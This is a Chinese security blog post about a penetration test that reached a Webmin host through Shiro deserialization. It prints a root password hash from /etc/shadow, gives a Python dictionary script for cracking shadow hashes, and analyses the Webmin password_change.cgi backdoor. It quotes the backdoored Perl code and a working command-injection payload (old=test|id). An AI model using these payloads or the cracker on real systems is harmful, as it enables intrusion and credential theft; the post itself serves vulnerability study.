@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>一次cappvd引发的思考 | dummersoul's Blog</title><meta name="keywords" content="perl"><meta name="author" content="dummersoul"><meta name="copyright" content="dummersoul"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言在挖cappvd时遇到一个后台为webmin，前面shrio反序列化已经打进去了，所以尝试一下内网是否有用户名和密码的信息。  翻看了一下内网发现有redis和mysql服务，mysql且没有设置密码   查找webmin的密码，发现webmin的密码是与&#x2F;etc&#x2F;shadow联动的   查阅资料说，webmin是用于Unix系统管理的一个web服务，相当于是以root权限进行登录，所以理所当">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次cappvd引发的思考">
+<meta property="og:url" content="https://dummersoul.github.io/2023/11/28/%E4%B8%80%E6%AC%A1cappvd%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="dummersoul&#39;s Blog">
+<meta property="og:description" content="前言在挖cappvd时遇到一个后台为webmin，前面shrio反序列化已经打进去了，所以尝试一下内网是否有用户名和密码的信息。  翻看了一下内网发现有redis和mysql服务，mysql且没有设置密码   查找webmin的密码，发现webmin的密码是与&#x2F;etc&#x2F;shadow联动的   查阅资料说，webmin是用于Unix系统管理的一个web服务，相当于是以root权限进行登录，所以理所当">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png">
+<meta property="article:published_time" content="2023-11-28T08:48:58.519Z">
+<meta property="article:modified_time" content="2022-10-14T10:01:12.000Z">
+<meta property="article:author" content="dummersoul">
+<meta property="article:tag" content="perl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dummersoul.github.io/2023/11/28/%E4%B8%80%E6%AC%A1cappvd%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-14 18:01:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="dummersoul's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dummersoul's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">一次cappvd引发的思考</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.519Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-14T10:01:12.000Z" title="更新于 2022-10-14 18:01:12">2022-10-14</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在挖cappvd时遇到一个后台为webmin，前面shrio反序列化已经打进去了，所以尝试一下内网是否有用户名和密码的信息。</p>
+<p><img src="https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png" alt="image-20221014094403605"></p>
+<p>翻看了一下内网发现有redis和mysql服务，mysql且没有设置密码</p>
+<p><img src="https://s2.loli.net/2022/10/14/RtxaEb3ZKcDMBuj.png" alt="Image"></p>
+<p><img src="https://s2.loli.net/2022/10/14/tP1FOMUn35ehHzr.png" alt="Image"></p>
+<p>查找webmin的密码，发现webmin的密码是与/etc/shadow联动的</p>
+<p><img src="https://s2.loli.net/2022/10/14/ULEkINYtaquSM34.png" alt="image-20221014105006470"></p>
+<p><img src="https://s2.loli.net/2022/10/14/apM6DJTxXN19iuA.png" alt="image-20221014105058604"></p>
+<p>查阅资料说，webmin是用于Unix系统管理的一个web服务，相当于是以root权限进行登录，所以理所当然密码也是root密码，于是翻看了下/etc/shadow确认root账户名称是否有变更</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$Gx1Dj&#x2F;.p0$uJEaQDHAiKe.Xg&#x2F;4ROVV5.QpROw4td7lTe6TPONpXGFSAS6Ok.t3sJl6CyTe.dPa.yQo2yU3ePfsu61sbwTVL.:18403:0:99999:7::: </span><br></pre></td></tr></table></figure>
+
+<p>lastlog查看上次管理员登录时间，发现是上周五登录过一次，估计短时间不会再登录了，所以没有抓取密码的必要。尝试用脚本进行爆破，把/etc/shadow文件内容复制下来，在本机进行爆破</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt   <span class="comment">## 导入 Linux 口令加密库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testPass</span>(<span class="params">cryptPass</span>):</span></span><br><span class="line">    salt=cryptPass[cryptPass.find(<span class="string">&quot;$&quot;</span>):cryptPass.rfind(<span class="string">&quot;$&quot;</span>)]  <span class="comment">## 获得盐值，包含 $id 部分</span></span><br><span class="line">    dictFile=<span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> dictFile.readlines():</span><br><span class="line">        word=word.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        cryptWord=crypt.crypt(word,salt)                   <span class="comment">## 将密码字典中的值和盐值一起加密</span></span><br><span class="line">        <span class="keyword">if</span> (cryptWord==cryptPass):                        <span class="comment">## 判断加密后的数据和密码字段是否相等</span></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]Found Password:&quot;</span>+word+<span class="string">&quot;\n&quot;</span> )      <span class="comment">## 如果相等则打印出来</span></span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;[-] Password Not Found.\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    passFile=<span class="built_in">open</span>(<span class="string">&#x27;shadow.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():      <span class="comment">## 读取文件中的所有内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            user=line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]                     <span class="comment">## 获得用户名</span></span><br><span class="line">            cryptPass=line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip(<span class="string">&#x27; &#x27;</span>)     <span class="comment">## 获得密码字段</span></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[*] Cracking Password for:&quot;</span>+user)</span><br><span class="line">            testPass(cryptPass)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/10/14/JvXnFjBHTalSAow.png" alt="image-20221014111725507"></p>
+<p>于是开始了漫长的等待，如果密码字典够强大，是可以爆出密码字段的，但是好像也没啥大用，顶多就是多获取了一个web的登录权限，内网权限都已经有了，好像没必要，算不算绕了个弯路。。。</p>
+<p>在查阅资料时，还发现webmin有一个RCE漏洞，官方给出的版本是Webmin&lt;=1.920，查看我们这个目标的服务权限是 server=MiniServ/1.973，哦吼又少了一个可以提交的报告</p>
+<h2 id="漏洞探究"><a href="#漏洞探究" class="headerlink" title="漏洞探究"></a>漏洞探究</h2><p>RCE的触发是由于开启了密码重置功能，允许用户使用旧密码设置新密码的功能点，在Webmin-Webmin Configuration-Authentication-Password expiry policy中选择，如下图：</p>
+<p><img src="https://s2.loli.net/2022/10/14/UWBJhFzmp4SxOu3.png" alt="image-20221014113158609"></p>
+<p>设置之后，webmin的配置文件/etc/webmin/miniserv.conf 中password_mode值为2，没设置的为0，从上面的截图看是password_mode=0，所以不存在RCE</p>
+<p>通过vulfocus靶场复现，在登录处抓包，将POST请求修改为 /password_change.cgi ，传递参数改为user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=2&amp;new2=2 ，在旧密码参数处进行命令拼接，即可造成RCE</p>
+<p><img src="https://s2.loli.net/2022/10/14/QOI5AivkqcLDhGW.png" alt="Image"></p>
+<p>查找password_change.cgi </p>
+<p><img src="https://s2.loli.net/2022/10/14/uG4iqQCJlIyoSmt.png" alt="image-20221014132437497"></p>
+<p>触发的首要条件$miniserv{‘passwd_mode’} == 2</p>
+<p>存在漏洞的1.920版本 password_change.cgi 代码如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($wuser) &#123;</span><br><span class="line">    <span class="comment"># Update Webmin user&#x27;s password</span></span><br><span class="line">    $enc = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;old&#x27;</span>&#125;, $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">    $enc eq $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; || &amp;pass_error($text&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">&#x27;old&#x27;</span>&#125;/);</span><br><span class="line">    $perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">&#x27;user&#x27;</span>&#125;, $in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">    $perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">&#x27;password_enewpass&#x27;</span>, $perr));</span><br><span class="line">    $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">    $wuser-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>;</span><br><span class="line">    &amp;acl::modify_user($wuser-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, $wuser);</span><br><span class="line">    &amp;reload_miniserv();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这块是最关键的代码执行处，要先满足$wuser变量不为1时才能进入if条件语言中，而这个变量是在</p>
+<p>判断用户是否属于Webmin user时赋值的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ($wuser-&gt;&#123;&#39;pass&#39;&#125; eq &#39;x&#39;) &#123;</span><br><span class="line">       # A Webmin user, but using Unix authentication</span><br><span class="line">       $wuser &#x3D; undef;</span><br><span class="line">       &#125;</span><br><span class="line">   elsif ($wuser-&gt;&#123;&#39;pass&#39;&#125; eq &#39;*LK*&#39; ||</span><br><span class="line">          $wuser-&gt;&#123;&#39;pass&#39;&#125; &#x3D;~ &#x2F;^\!&#x2F;) &#123;</span><br><span class="line">       &amp;pass_error(&quot;Webmin users with locked accounts cannot change &quot;.</span><br><span class="line">                   &quot;their passwords!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果登录用户是Webmin user，则pass字段为x ，$wuser变量赋值为undef，也就是0；</p>
+<p>如果登录用户不是Webmin user，pass字段是一段字符串，且$wuser变量为{}，可以进入if ($wuser)语句进一步执行<code>$enc eq $wuser-&gt;&#123;&#39;pass&#39;&#125; || &amp;pass_error($text&#123;&#39;password_eold&#39;&#125;,qx/$in&#123;&#39;old&#39;&#125;/);</code> ，进而执行到 <strong>qx/$in{‘old’}/</strong></p>
+<p><img src="https://s2.loli.net/2022/10/14/W4RrjshYimnGK7O.png" alt="image-20221014141323924"></p>
+<p>qx//是反引号执行，能捕获执行结果，所以old为可控参数，这个也是疑似被插入后门的地方。</p>
+<p>所以payload：user=rootxx&amp;pam=&amp;expired=2&amp;old=test|<strong>id</strong>&amp;new1=2&amp;new2=2 中user rootxx不是webmin user,  old传参中的<code>id</code> 就被执行了。且会被pass_error方法打印出来，pass_error没有进行任何校验，所以直接传输恶意代码不需要管道符也能RCE</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">pass_error</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&amp;header(<span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="keyword">undef</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">print</span> &amp;ui_hr();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;center&gt;&lt;h3&gt;&quot;</span>,$text&#123;<span class="string">&#x27;password_err&#x27;</span>&#125;,<span class="string">&quot; : &quot;</span>,@_,<span class="string">&quot;&lt;/h3&gt;&lt;/center&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &amp;ui_hr();</span><br><span class="line">&amp;footer();</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>验证了webmin是有历史后门之后，查看目标服务器中的password_change.cgi文件，并未发现qx/…./代码</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($wuser) &#123;</span><br><span class="line">	<span class="comment"># Update Webmin user&#x27;s password</span></span><br><span class="line">	$ok = &amp;acl::validate_password($in&#123;<span class="string">&#x27;old&#x27;</span>&#125;, $wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;);</span><br><span class="line">	$ok || &amp;pass_error($text&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;);</span><br><span class="line">	$perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">&#x27;user&#x27;</span>&#125;, $in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	$perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">&#x27;password_enewpass&#x27;</span>, $perr));</span><br><span class="line">	$wuser-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	$wuser-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>;</span><br><span class="line">	&amp;acl::modify_user($wuser-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, $wuser);</span><br><span class="line">	&amp;reload_miniserv();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在1.890版本中，也被插入了 qx/$in{‘expored’}/ , 只要传输expired参数即可RCE，也不需要passwd_mode=2这个限制条件，后门太强大。</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/10/14/TRvoH78XzSIOYJG.png" alt="image-20221014143633723"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>遇到webmin需要注意一下版本号，如果响应中server=MiniServ/1.890， 先尝试一下是否有expired这个后门参数，再试传统的payload，Webmin&lt;=1.920也要尝试一下是否存在RCE</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /password_change.cgi</span><br><span class="line">......</span><br><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=id&amp;new1=2&amp;new2=2</span><br></pre></td></tr></table></figure>
+
+<p>间接熟悉了一下perl代码 :)</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1019/#_1">https://paper.seebug.org/1019/#_1</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">dummersoul</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dummersoul.github.io/2023/11/28/%E4%B8%80%E6%AC%A1cappvd%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/">https://dummersoul.github.io/2023/11/28/一次cappvd引发的思考/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dummersoul.github.io" target="_blank">dummersoul's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/perl/">perl</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/10/14/Pzv4Is8yTGJrFCZ.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/28/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83(CVE-2016-5195)/"><img class="prev-cover" src="/img/dirtycow.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">脏牛提权（CVE-2016-5195）</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/28/%E5%AD%A6%E4%B9%A0git%E5%88%86%E6%94%AF/"><img class="next-cover" src="https://learngitbranching.js.org/assets/favicon.ico" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">学习git分支</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">dummersoul</div><div class="author-info__description">网络安全从业者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dummersoul"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dummersoul" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dummersoul@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到dummersoul的技术小窝</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6"><span class="toc-number">2.</span> <span 